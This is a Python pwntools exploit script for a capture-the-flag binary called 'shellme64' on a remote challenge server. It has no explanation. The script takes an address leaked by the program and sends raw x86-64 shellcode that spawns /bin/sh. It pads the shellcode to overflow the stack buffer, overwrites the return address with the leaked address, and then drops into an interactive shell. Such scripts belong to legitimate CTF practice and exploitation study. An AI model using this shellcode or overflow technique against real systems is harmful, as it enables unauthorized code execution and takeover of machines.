#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
# context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./shellme64')
else:
    p = remote('chal.tuctf.com', 30507)

p.recvuntil("Hey! I think you dropped this\n")
addr_target = int(p.recv(14), 16)
pd = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
pd = pd.ljust(0x28, '\x00')
pd += p64(addr_target)
p.sendafter('\n> ', pd)
p.interactive()
